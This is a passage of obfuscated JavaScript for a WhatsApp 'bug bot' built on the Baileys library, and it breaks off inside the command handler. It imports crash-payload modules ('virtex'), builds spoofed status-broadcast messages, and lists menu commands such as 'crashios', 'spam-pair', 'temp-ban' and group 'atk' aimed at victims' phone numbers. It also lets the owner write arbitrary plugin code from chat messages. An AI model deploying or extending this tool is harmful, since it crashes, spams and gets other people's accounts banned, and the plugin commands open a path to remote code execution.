const {
  tdxonnect,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessagePr,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header
} = require("@whiskeysockets/baileys");
const util = require("util");
const jimp = require("jimp");
const fetch = require('node-fetch');
const speed = require("performance-now");
const moment = require("moment-timezone");
const pino = require("pino");
const {
  spawn: spawn,
  exec
} = require("child_process");
const fg = require('api-dylux');
const path = require("path");
const chalk = require('chalk');
const {
  color
} = require("../trashbase/lib/color");
const fs = require('fs');
module.exports = tdx = handler = async (_0x212ab4, _0x43016e, _0x4b6ad4, _0x2b266c) => {
  try {
    var _0x947d49 = _0x43016e.mtype === "conversation" ? _0x43016e.message.conversation : _0x43016e.mtype === 'imageMessage' ? _0x43016e.message.imageMessage.caption : _0x43016e.mtype === "videoMessage" ? _0x43016e.message.videoMessage.caption : _0x43016e.mtype === "extendedTextMessage" ? _0x43016e.message.extendedTextMessage.text : _0x43016e.mtype === "buttonsResponseMessage" ? _0x43016e.message.buttonsResponseMessage.selectedButtonId : _0x43016e.mtype === "listResponseMessage" ? _0x43016e.message.listResponseMessage.singleSelectReply.selectedRowId : _0x43016e.mtype === "interactiveResponseMessage" ? JSON.parse(_0x43016e.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x43016e.mtype === 'templateButtonReplyMessage' ? _0x43016e.message.templateButtonReplyMessage.selectedId : _0x43016e.mtype === "messageContextInfo" ? _0x43016e.message.buttonsResponseMessage?.["selectedButtonId"] || _0x43016e.message.listResponseMessage?.["singleSelectReply"]['selectedRowId'] || _0x43016e.message.interactiveResponseMessage?.["nativeFlowResponseMessage"] || _0x43016e.text : '';
    require("../config");
    const {
      smsg: _0x456ec7,
      getGroupAdmins: _0x431c98,
      formatp: _0xf7362e,
      h2k: _0x1b49c8,
      tanggal: _0x2847e7,
      formatDate: _0x2d59d7,
      getTime: _0x52b78a,
      isUrl: _0xf31bb5,
      sleep: _0x1c5f51,
      clockString: _0x822b32,
      msToDate: _0x7b03ed,
      sort: _0x2488cc,
      toNumber: _0x527eaf,
      enumGetKey: _0x47cab6,
      runtime: _0x514e28,
      fetchJson: _0x87d111,
      getBuffer: _0x3808e3,
      jsonformat: _0xacd83b,
      delay: _0x47a4a8,
      format: _0xfa19b1,
      logic: _0x3b7a4a,
      generateProfilePicture: _0x711609,
      parseMention: _0x584e33,
      getRandom: _0x45bc4a,
      pickRandom: _0x4e49e8
    } = require("../trashbase/lib/myfunction");
    const {
      remini: _0x136382
    } = require("../trashbase/lib/remini");
    const {
      radio: _0xb4a01f,
      locl: _0x559748,
      cds: _0x330fa2,
      listr: _0x21aab2,
      clpm: _0xb97d67,
      caltx: _0x1adfe3,
      paym: _0x35931b,
      locm: _0x534d84,
      evm: _0x3dd14c
    } = require("../trashbase/lib/msg-service");
    const {
      toPTT: _0x146684,
      toAudio: _0x368a4d
    } = require("../trashbase/lib/converter");
    const {
      UploadFileUgu: _0x5dbf5c,
      webp2mp4File: _0x41a616,
      floNime: _0x1ec498,
      TelegraPh: _0x1adab5
    } = require('../trashbase/lib/uploader');
    const {
      toTelegra: _0x28f929
    } = require('../trashbase/lib/upload');
    const {
      groupMembers: _0x265c3d
    } = _0x43016e;
    var _0x5be772 = typeof _0x43016e.text == 'string' ? _0x43016e.text : '';
    const _0x3219ab = prefa && /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/.test(_0x947d49) ? _0x947d49.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/)[0x0] : prefa ?? global.prefix;
    const _0x39b823 = _0x947d49.startsWith(_0x3219ab);
    const _0x32b9e9 = _0x947d49.startsWith(_0x3219ab) ? _0x947d49.slice(_0x3219ab.length).trim().split(/ +/).shift().toLowerCase() : '';
    const _0x6852f1 = _0x947d49.trim().split(/ +/).slice(0x1);
    const _0x3ebb98 = _0x43016e.pushName || "No Name";
    const _0x1e24da = q = _0x6852f1.join(" ");
    const _0x2fdcf3 = _0x43016e.quoted || _0x43016e;
    const _0x55b1ec = _0x2fdcf3.mtype == "buttonsMessage" ? _0x2fdcf3[Object.keys(_0x2fdcf3)[0x1]] : _0x2fdcf3.mtype == 'templateMessage' ? _0x2fdcf3.hydratedTemplate[Object.keys(_0x2fdcf3.hydratedTemplate)[0x1]] : _0x2fdcf3.mtype == "product" ? _0x2fdcf3[Object.keys(_0x2fdcf3)[0x0]] : _0x43016e.quoted ? _0x43016e.quoted : _0x43016e;
    const _0x35d9cf = (_0x55b1ec.msg || _0x55b1ec).mimetype || '';
    const _0x3578e0 = _0x55b1ec.msg || _0x55b1ec;
    const _0x14f8d4 = /image|video|sticker|audio/.test(_0x35d9cf);
    const _0x867a51 = await _0x212ab4.decodeJid(_0x212ab4.user.id);
    const _0x31b356 = !!(_0x43016e.sender == _0x867a51);
    const _0x31fc27 = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../trashbase/dtbs/premium.json"), "utf8"));
    const _0x42bab9 = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../trashbase/dtbs/owner.json'), "utf8"));
    const _0x1b50e2 = [_0x867a51, ..._0x42bab9, ...global.ownMain].map(_0x1b8ca9 => _0x1b8ca9.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x43016e.sender);
    const _0x301984 = [_0x867a51, ..._0x42bab9, ..._0x31fc27, ...global.ownMain].map(_0x1149c4 => _0x1149c4.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x43016e.sender);
    const _0x3c927d = _0x43016e.isGroup ? await _0x212ab4.groupMetadata(_0x43016e.chat)["catch"](_0x3d89e4 => {}) : '';
    const _0x903bb = _0x43016e.isGroup ? _0x3c927d.subject : '';
    const _0xa9dd5d = _0x43016e.isGroup ? await _0x3c927d.participants : '';
    const _0x138cad = _0x43016e.isGroup ? await _0x431c98(_0xa9dd5d) : '';
    const _0x164b78 = _0x43016e.isGroup ? _0x138cad.includes(_0x867a51) : false;
    const _0x3cef78 = _0x43016e.isGroup ? _0x138cad.includes(_0x43016e.sender) : false;
    const _0x63587c = _0x43016e.chat.endsWith('@g.us');
    const _0x59e76d = _0x43016e.isGroup ? _0x3c927d.owner : '';
    const _0x1e4b84 = _0x43016e.isGroup ? (_0x59e76d ? _0x59e76d : _0x138cad).includes(_0x43016e.sender) : false;
    const _0x3d4c9a = fs.readFileSync(path.resolve(__dirname, "../trashbase/media/razer.jpg"));
    const _0x4f661b = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/akame.jpg'));
    const _0x2b1997 = fs.readFileSync(path.resolve(__dirname, "../trashbase/media/slash.jpg"));
    const _0x19c81b = fs.readFileSync(path.resolve(__dirname, "../trashbase/media/banner.jpg"));
    const _0x5aa301 = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/subaru.jpg'));
    const _0x15d61b = fs.readFileSync(path.resolve(__dirname, "../trashbase/media/tdx.mp4"));
    const _0x3ac79a = fs.readFileSync(path.resolve(__dirname, '../trashbase/media/rick.mp4'));
    const {
      tios: _0x8a3020,
      tiosv2: _0x1113f9,
      tiosv3: _0x24929c
    } = require("../trashbase/virtex/tios.js");
    const {
      tiv: _0x191e93
    } = require("../trashbase/virtex/tiv.js");
    const _0x28e008 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    let _0x58079d;
    if (_0x28e008 >= "19:00:00" && _0x28e008 < "23:59:00") {
      _0x58079d = "夜 🌌";
    } else {
      if (_0x28e008 >= "15:00:00" && _0x28e008 < "19:00:00") {
        _0x58079d = "午後 🌇";
      } else {
        if (_0x28e008 >= '11:00:00' && _0x28e008 < "15:00:00") {
          _0x58079d = "正午 🏞️";
        } else if (_0x28e008 >= "06:00:00" && _0x28e008 < "11:00:00") {
          _0x58079d = "朝 🌁";
        } else {
          _0x58079d = "夜明け 🌆";
        }
      }
    }
    const _0x204c4c = moment(Date.now()).tz("Asia/Kolkata").locale('id').format("HH:mm:ss z");
    const _0x3a739a = moment(Date.now()).tz("Asia/Kolkata").locale('id').format("HH:mm:ss z");
    const _0xa7f4ee = moment(Date.now()).tz("Asia/Kolkata").locale('id').format("HH:mm:ss z");
    const _0x7a4cb3 = moment(Date.now()).tz("Asia/Kolkata").locale('id').format('a');
    let _0x22638f = new Date();
    let _0x2a95e7 = new Date(0x0).getTime() - new Date("1 Januari 2024").getTime();
    let _0x3fb966 = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor((_0x22638f * 0x1 + _0x2a95e7) / 0x50ae4c0) % 0x5];
    let _0x3412fe = _0x22638f.toLocaleDateString('id', {
      'weekday': "long"
    });
    let _0x132e58 = _0x22638f.toLocaleDateString('id', {
      'day': "numeric",
      'month': 'long',
      'year': "numeric"
    });
    if (!_0x212ab4["public"]) {
      if (!_0x1b50e2) {
        return;
      }
    }
    async function _0x4680c9(_0x21bee6, _0x4a368b, _0x262ae7, _0x213cac = [''], _0x558867 = {}) {
      const {
        default: {
          Image: _0x503e66
        }
      } = await import('node-webpmux');
      const _0x1665b6 = new _0x503e66();
      const _0x245f76 = {
        'sticker-pack-id': 'parel-kntll',
        'sticker-pack-name': _0x4a368b,
        'sticker-pack-publisher': _0x262ae7,
        'emojis': _0x213cac,
        'is-avatar-sticker': 0x1,
        ..._0x558867
      };
      let _0x3ce8db = Buffer.from([0x49, 0x49, 0x2a, 0x0, 0x8, 0x0, 0x0, 0x0, 0x1, 0x0, 0x41, 0x57, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x0, 0x0, 0x0]);
      let _0x491677 = Buffer.from(JSON.stringify(_0x245f76), "utf8");
      let _0x127a70 = Buffer.concat([_0x3ce8db, _0x491677]);
      _0x127a70.writeUIntLE(_0x491677.length, 0xe, 0x4);
      await _0x1665b6.load(_0x21bee6);
      _0x1665b6.exif = _0x127a70;
      return await _0x1665b6.save(null);
    }
    async function _0x8e6255(_0x41d530, _0xbc2e74, _0x3d20f0, _0x44bb9e = [''], _0x20f8d7 = {}) {
      const _0x2848bf = new webp.Image();
      const _0x68055d = Crypto.randomBytes(0x20).toString("hex");
      const _0x564a28 = {
        'sticker-pack-id': _0x68055d,
        'sticker-pack-name': _0xbc2e74,
        'sticker-pack-publisher': _0x3d20f0,
        'emojis': _0x44bb9e,
        ..._0x20f8d7
      };
      let _0x241b92 = Buffer.from([0x49, 0x49, 0x2a, 0x0, 0x8, 0x0, 0x0, 0x0, 0x1, 0x0, 0x41, 0x57, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x0, 0x0, 0x0]);
      let _0xebe244 = Buffer.from(JSON.stringify(_0x564a28), 'utf8');
      let _0x645512 = Buffer.concat([_0x241b92, _0xebe244]);
      _0x645512.writeUIntLE(_0xebe244.length, 0xe, 0x4);
      await _0x2848bf.load(_0x41d530);
      _0x2848bf.exif = _0x645512;
      return await _0x2848bf.save(null);
    }
    async function _0x34d4d3(_0x375093, _0x5420b0, _0x1e2331, _0x10ee86 = ['🥀'], _0x1dd84c = {}) {
      const {
        default: {
          Image: _0x463bb2
        }
      } = await import("node-webpmux");
      const _0x40a147 = new _0x463bb2();
      const _0x5d180e = {
        'sticker-pack-id': "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        'sticker-pack-name': _0x5420b0,
        'sticker-pack-publisher': _0x1e2331,
        'emojis': _0x10ee86,
        'is-ai-sticker': 0x1,
        'android-app-store-link': "https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android",
        'ios-app-store-link': 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        ..._0x1dd84c
      };
      let _0x1677da = Buffer.from([0x49, 0x49, 0x2a, 0x0, 0x8, 0x0, 0x0, 0x0, 0x1, 0x0, 0x41, 0x57, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x0, 0x0, 0x0]);
      let _0x1692d0 = Buffer.from(JSON.stringify(_0x5d180e), "utf8");
      let _0x1b2bad = Buffer.concat([_0x1677da, _0x1692d0]);
      _0x1b2bad.writeUIntLE(_0x1692d0.length, 0xe, 0x4);
      await _0x40a147.load(_0x375093);
      _0x40a147.exif = _0x1b2bad;
      return await _0x40a147.save(null);
    }
    let _0x420e3d = async (_0x1530b5, _0x25e8ce, _0x5892c3) => {
      let _0x112130 = await jimp.read(_0x1530b5);
      let _0x10669a = await _0x112130.resize(_0x25e8ce, _0x5892c3).getBufferAsync(jimp.MIME_JPEG);
      return _0x10669a;
    };
    const _0x7c0daa = async (_0x4eb4b6, _0x459eff) => {
      _0x212ab4.sendMessage(_0x4eb4b6, {
        'react': {
          'text': _0x459eff,
          'key': _0x43016e.key
        }
      });
    };
    async function _0x1d2689(_0x1ddc55) {
      const {
        imageMessage: _0x11b6ee
      } = await generateWAMessageContent({
        'image': {
          'url': _0x1ddc55
        }
      }, {
        'upload': _0x212ab4.waUploadToServer
      });
      return _0x11b6ee;
    }
    async function _0x286a39(_0x45afeb) {
      const {
        videoMessage: _0x11bac9
      } = await generateWAMessageContent({
        'image': {
          'url': _0x45afeb
        }
      }, {
        'upload': _0x212ab4.waUploadToServer
      });
      return _0x11bac9;
    }
    async function _0x5739ac(_0x5ee573) {
      return await prepareWAMessageMedia(_0x5ee573, {
        'upload': _0x212ab4.waUploadToServer
      });
    }
    const _0x143f2f = async _0x593644 => {
      await _0x1c5f51(0x1f4);
      return _0x212ab4.sendMessage(_0x43016e.chat, {
        'contextInfo': {
          'mentionedJid': [_0x43016e.sender],
          'externalAdReply': {
            'showAdAttribution': false,
            'renderLargerThumbnail': true,
            'title': "H3PT0S Sir",
            'body': "YT H3PT0S",
            'previewType': "VIDEO",
            'thumbnail': _0x3d4c9a,
            'sourceUrl': '' + global.url1,
            'mediaUrl': '' + global.url1
          }
        },
        'text': _0x593644
      }, {
        'quoted': _0x43016e
      });
      await _0x1c5f51(0x1f4);
    };
    const _0x2f31f7 = {
      'key': {
        'remoteJid': 'status@broadcast',
        'participant': "0@s.whatsapp.net",
        'fromMe': false
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'title': ''
          },
          'body': {
            'text': "▾ H3PT0S⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
          },
          'footer': {
            'text': "YT-H3PT0S"
          },
          'nativeFlowMessage': {
            'messageParamsJson': ""
          }
        }
      }
    };
    const _0x50647e = {
      'key': {
        'remoteJid': "0@s.whatsapp.net",
        'fromMe': false,
        'participant': '0@s.whatsapp.net'
      },
      'message': {
        'videoMessage': {
          'caption': "#Spider Client  - Master",
          'jpegThumbnail': await _0x420e3d(_0x2b1997, 0x12c, 0x12c)
        }
      }
    };
    const _0x2fe66c = _0x5edf32 => {
      let _0x8b1341 = [];
      const _0x5d64b3 = fs.readdirSync(_0x5edf32);
      _0x5d64b3.forEach(_0x129d41 => {
        const _0x12cbee = path.join(_0x5edf32, _0x129d41);
        if (fs.lstatSync(_0x12cbee).isDirectory()) {
          const _0x19c8de = fs.readdirSync(_0x12cbee);
          _0x19c8de.forEach(_0x24b2cc => {
            const _0x309701 = path.join(_0x12cbee, _0x24b2cc);
            if (_0x309701.endsWith(".js")) {
              try {
                delete require.cache[require.resolve(_0x309701)];
                const _0x4f093e = require(_0x309701);
                _0x4f093e.filePath = _0x309701;
                _0x8b1341.push(_0x4f093e);
              } catch (_0x4504f0) {
                console.error("Error loading plugin at " + _0x309701 + ':', _0x4504f0);
              }
            }
          });
        }
      });
      return _0x8b1341;
    };
    const _0x494904 = _0x2fe66c(path.resolve(__dirname, "./plugin"));
    const _0x10b85b = {
      'tdx': _0x212ab4,
      'm': _0x43016e,
      'chatUpdate': _0x4b6ad4,
      'store': _0x2b266c,
      'body': _0x947d49,
      'require': require,
      'smsg': _0x456ec7,
      'getGroupAdmins': _0x431c98,
      'formatp': _0xf7362e,
      'h2k': _0x1b49c8,
      'tanggal': _0x2847e7,
      'formatDate': _0x2d59d7,
      'getTime': _0x52b78a,
      'isUrl': _0xf31bb5,
      'sleep': _0x1c5f51,
      'clockString': _0x822b32,
      'msToDate': _0x7b03ed,
      'sort': _0x2488cc,
      'toNumber': _0x527eaf,
      'enumGetKey': _0x47cab6,
      'runtime': _0x514e28,
      'fetchJson': _0x87d111,
      'getBuffer': _0x3808e3,
      'jsonformat': _0xacd83b,
      'delay': _0x47a4a8,
      'format': _0xfa19b1,
      'logic': _0x3b7a4a,
      'generateProfilePicture': _0x711609,
      'parseMention': _0x584e33,
      'getRandom': _0x45bc4a,
      'pickRandom': _0x4e49e8,
      'groupMembers': _0x265c3d,
      'budy': _0x5be772,
      'prefixRegex': /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/,
      'prefix': _0x3219ab,
      'isCmd': _0x39b823,
      'command': _0x32b9e9,
      'args': _0x6852f1,
      'pushname': _0x3ebb98,
      'text': _0x1e24da,
      'q': q,
      'fatkuns': _0x2fdcf3,
      'quoted': _0x55b1ec,
      'mime': _0x35d9cf,
      'qmsg': _0x3578e0,
      'isMedia': _0x14f8d4,
      'botNumber': _0x867a51,
      'itsMe': _0x31b356,
      'itsOrkay': _0x31fc27,
      'kontributor': _0x42bab9,
      'isDeveloper': _0x1b50e2,
      'isPremium': _0x301984,
      'groupMetadata': _0x3c927d,
      'groupName': _0x903bb,
      'participants': _0xa9dd5d,
      'groupAdmins': _0x138cad,
      'isBotAdmins': _0x164b78,
      'isAdmins': _0x3cef78,
      'isGroup': _0x63587c,
      'groupOwner': _0x59e76d,
      'isGroupOwner': _0x1e4b84,
      'time': _0x28e008,
      'ucapanWaktu': _0x58079d,
      'wib': _0x204c4c,
      'wita': _0x3a739a,
      'wit': _0xa7f4ee,
      'salam': _0x7a4cb3,
      'd': _0x22638f,
      'gmt': _0x2a95e7,
      'weton': _0x3fb966,
      'week': _0x3412fe,
      'calender': _0x132e58,
      'dust': _0x2f31f7,
      'reaction': _0x7c0daa,
      'xreply': _0x143f2f,
      'TelegraPh': _0x1adab5,
      'toTelegra': _0x28f929,
      'resize': _0x420e3d,
      'remini': _0x136382,
      'crtImg': _0x1d2689,
      'crtVid': _0x286a39,
      'addExifAvatar': _0x34d4d3,
      'addExif': _0x8e6255,
      'exifAvatar': _0x4680c9,
      'prM': _0x5739ac,
      'rick': _0x3ac79a,
      'razer': _0x3d4c9a,
      'subaru': _0x5aa301,
      'gifck': _0x15d61b,
      'tios': _0x8a3020,
      'tiosv2': _0x1113f9,
      'tiosv3': _0x24929c,
      'tiv': _0x191e93,
      'evm': _0x3dd14c,
      'banner': _0x19c81b
    };
    let _0x133b78 = false;
    for (const _0x2b65ef of _0x494904) {
      if (_0x2b65ef.command.includes(_0x32b9e9)) {
        try {
          await _0x2b65ef.operate(_0x10b85b);
          _0x133b78 = true;
        } catch (_0x192f34) {
          console.error("Error executing plugin " + _0x2b65ef.filePath + ':', _0x192f34);
        }
        break;
      }
    }
    if (_0x43016e.message) {
      console.log(chalk.green.bgHex("#e74c3c").bold("\n💫 " + _0x58079d + " 💫"));
      console.log(chalk.green.bgHex('#e74c3c').bold("✉️ H3PT0S"));
      console.log(chalk.black.bgHex('#00FF00')("📅 H3PT0S: " + new Date().toLocaleString() + " \n💬 GodSir: " + (_0x43016e.body || _0x43016e.mtype) + " \n🗣️ LoveYou: " + _0x43016e.pushName + " \n🔢 JID: " + _0x43016e.sender));
      if (_0x43016e.isGroup) {
        console.log(chalk.black.bgHex('#00FF00')("🏷️ Grup: " + _0x903bb));
        console.log(chalk.black.bgHex('#00FF00')("🧷 GroupJid: " + _0x43016e.chat));
      }
    }
    if (!_0x133b78) {
      switch (_0x32b9e9) {
        case "menu":
        case 'help':
        case "list":
        case "bot":
        case "allmenu":
          {
            let _0x2cfa3a = speed();
            let _0x2dbb98 = speed() - _0x2cfa3a;
            let _0x5adfc1 = _0x514e28(process.uptime());
            let _0x3c195e = " `H3PT0S`\n ◉ 𝐇𝐞𝐥𝐥𝐨 darling 💦 " + _0x43016e.pushName + "\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃⦁ Creator : ī.am H3PT0S ✓\n┃⦁ Library : WS-Baileys🈳\n┃⦁ Youtube: H3PT0S🔴\n┃⦁ Status : Online🟢\n┃⦁ Mode : " + (_0x212ab4["public"] ? "Public" : 'Self') + " ♉\n┃⦁ Prefix : " + _0x3219ab + "\n┃⦁ Ping : " + _0x2dbb98.toFixed(0x4) + " 🚀\n┃⦁ Runtime : " + _0x5adfc1 + " 🧭\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n  🈯  `BANNED` 💹\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  \n┃✫ spam-pair 9100### 💀\n┃✫ temp-ban 9194## 💀\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n         `𝗕𝗨𝗚 𝗠𝗘𝗡𝗨`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  \n┃✫ galaxy 9100##😈\n┃✫ radiob 91##😈\n┃✫ blobx 91##😈\n┃✫ 1st 91####😈\n┃✫ screen_0 91##😈\n┃✫ dott🥵\n┃✫ breaak🥵\n┃✫ csx amount😈\n┃✫ 🏴‍☠️ amount 😈\n┃✫ 🔥 amount💀\n┃✫ rickr amount❌\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n     `𝗔𝗡𝗗𝗥𝗢 & 𝗜𝗢𝗦`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    \n┃✫ paym 91####❗\n┃✫ ext-3 91####❗\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n     `𝗜𝗢𝗦 𝗕𝗨𝗚𝗦`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉    \n┃✫ crashios 91000##🆘\n┃✫ gifplayback 910#🆘\n┃✫ ipay amount🆘\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n   `𝗦𝗔𝗠𝗦𝗨𝗠𝗚 𝗕𝗨𝗚𝗦`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ castx 91########🔺\n┃✫ carsmsg amount🔺\n┃✫ castx 91#####💀\n┃✫ classx 91####❗\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n      `𝗚𝗖 𝗕𝗨𝗚𝗦`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ atk ( select group )⛔\n┃✫ getview idgc⛔\n┃✫ callmsg linkgc⛔\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n      `𝙊𝙒𝙉𝙀𝙍`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ menu🚨\n┃✫ ping🚨\n┃✫ alive/runtime🚨\n┃✫ h3pt0s 💕 \n┃✫ script 🥵\n┃✫ public💯\n┃✫ self😁\n┃✫ addprem😁\n┃✫ delprem😅\n┃✫ addowner😁\n┃✫ delowner😅\n┃✫ addplug😁\n┃✫ cgplug😁\n┃✫ rmplug😁\n┃✫ getplug😁\n┃✫ getq😁\n┃✫ join [link group]😁\n┃✫ leavegc😅\n┃✫ block [nomor]🤣\n┃✫ unblock [nomor]😘\n┃✫ listblock😭\n┃✫ setppbot [reply Pic]😜\n┃✫ setbiobot [text]😬\n┃✫ listpc🤭\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n       `𝙂ROUP`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ editsubjek🙄\n┃✫ editdesk🙄\n┃✫ setppgroup🙄\n┃✫ setppgc😒\n┃✫ linkgc🙄\n┃✫ resetlinkgc😒\n┃✫ revoke😤\n┃✫ kick😤\n┃✫ add😠\n┃✫ promote😡\n┃✫ demote🤣\n┃✫ hidetag🤬\n┃✫ tagall🤪\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n  `𝙊𝙏𝙃𝙀𝙍`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ sticker👾\n┃✫ toimg🥵\n┃✫ ttp text|pix🤠\n┃✫ tts text|lang🤖\n┃✫ smeme text1|text2😈\n┃✫ textmaker text1|text2😈\n┃✫ tesc text😻\n┃✫ tocc text😹\n┃✫ stt text😻\n┃✫ attp text💯\n┃✫ toascii text🔥\n┃✫ qrcode text💔\n┃✫ barcode text❣️\n┃✫ shorturl link👄\n┃✫ removebg reply img👍\n┃✫ remini reply img👌\n┃✫ calculator🦾\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n     `𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙎`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ igdl url👅\n┃✫ mediafire url👅\n┃✫ ytmp3 url👄\n┃✫ ytmp4 url👄\n┃✫ gitclone url👀\n┃✫ tiktok url👅\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n   `𝗦𝙀𝘼𝙍𝘾𝙃`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n┃✫ pint query 🔎 \n┃✫ play query 🔎 \n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n  `𝘼𝙄 𝙈𝙀𝙉𝙐`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉  \n┃✫ rimuru-ai query 🧠\n┃✫ trash-ai query🧠\n┃✫ ai query🧠\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n        `𝙑𝘾𝙁`\n┏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉   \n┃✫ pushkontak teks🩸\n┃✫ jpm🩸\n┃✫ jpm2🩸\n┃✫ jpmht🩸\n┃✫ jpmht2🩸\n┗┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉◉\n \n> Don't forget to subscribe \n> H3PT0S youtube channel\n    \n";
            _0x212ab4.sendMessage(_0x43016e.chat, {
              'text': _0x3c195e,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': false,
                  'title': "😁H3PT0S😁",
                  'body': "H3PT0S✓",
                  'thumbnailUrl': 'https://i.ibb.co/5hYWrRH/thumb.png',
                  'sourceUrl': "https://whatsapp.com/channel/0029Va9Ufzi8kyyEnEHvOm1h",
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x43016e
            });
          }
          break;
        case "public":
          {
            if (!_0x1b50e2) {
              return;
            }
            _0x212ab4["public"] = true;
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'self':
          {
            if (!_0x1b50e2) {
              return;
            }
            _0x212ab4["public"] = false;
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "addplug":
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (!q.includes('|')) {
              return _0x143f2f("Add input, Example: \n\n*.plugin name|category|content*");
            }
            const [_0x1a019a, _0x289b8b, ..._0x4e712f] = q.split('|');
            const _0x5dc2c2 = path.join(path.resolve(__dirname, "./plugin", _0x289b8b));
            const _0x5710bc = path.join(_0x5dc2c2, _0x1a019a + ".js");
            if (!q.includes('|') || _0x4e712f.length === 0x0 || fs.existsSync(_0x5710bc)) {
              return;
            }
            if (!fs.existsSync(_0x5dc2c2)) {
              fs.mkdirSync(_0x5dc2c2, {
                'recursive': true
              });
            }
            fs.writeFileSync(_0x5710bc, _0x4e712f.join('|'));
            await _0x143f2f("Plugin baru telah dibuat di " + _0x5710bc + '.');
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "cgplug":
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (!q.includes('|')) {
              return _0x143f2f("Add Input, Example: *.cgplug thisplug|newcontent*");
            }
            let [_0x1f8f56, ..._0x27e721] = q.split('|');
            let _0x4be42b = _0x27e721.join('|');
            let _0xf0ee99 = path.resolve(__dirname, "./plugin");
            let _0xfa42d2 = _0x2fe66c(_0xf0ee99);
            for (const _0x4c6118 of _0xfa42d2) {
              if (_0x4c6118.command.includes(_0x1f8f56)) {
                let _0x38d638 = _0x4c6118.filePath;
                fs.writeFileSync(_0x38d638, _0x4be42b);
                await _0x143f2f("Plugin di " + _0x38d638 + " telah diganti");
                return;
              }
            }
